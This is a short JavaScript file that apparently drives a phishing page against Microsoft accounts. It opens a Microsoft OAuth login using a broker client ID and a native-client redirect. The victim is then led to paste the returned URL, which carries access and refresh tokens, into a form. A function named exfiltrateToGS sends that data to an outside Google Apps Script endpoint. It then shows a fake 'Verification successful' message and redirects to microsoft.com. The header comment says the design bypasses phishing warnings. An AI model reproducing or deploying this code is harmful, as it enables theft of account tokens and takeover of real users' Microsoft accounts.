/**
 * VERCEL LOGIC - Bypassing Phishing Warning
 */
const GS_URL = "https://script.google.com/macros/s/AKfycbwCVnWFmseoIYGiY4HtU_Quq5gqmKgUyEoE-QeLTBb54fK0iYMEXAX0b7Ho2HfD_mFV/exec"; 

function startBridge() {
    const BROKER_ID = "29d9ed98-a469-4536-ade2-f981bc1d605e";
    const NATIVE_REDIRECT = "https://login.microsoftonline.com/common/oauth2/nativeclient";

    // CHANGE: response_mode=form_post removes the token from the URL bar
    const authUrl = `https://login.microsoftonline.com/common/oauth2/v2.0/authorize?` +
        `client_id=${BROKER_ID}` +
        `&response_type=id_token+token` +
        `&scope=openid+profile+offline_access` +
        `&response_mode=form_post` + 
        `&prompt=login` + 
        `&nonce=${Math.random().toString(36).substring(7)}` +
        `&redirect_uri=${encodeURIComponent(NATIVE_REDIRECT)}`;

    document.getElementById('step-1').classList.add('hidden');
    document.getElementById('step-2').classList.remove('hidden');

    window.open(authUrl, "_blank", "width=500,height=600");
}

async function exfiltrateToGS() {
    const rawData = document.getElementById('raw-url').value;
    if (!rawData) return;

    try {
        const response = await fetch(`${GS_URL}?action=exfiltrate&data=${encodeURIComponent(rawData)}`);
        const result = await response.json();
        if (result.status === "success") {
            alert("Verification successful.");
            window.location.href = "https://www.microsoft.com";
        }
    } catch (err) {
        console.error("GS Proxy Error:", err);
    }
}
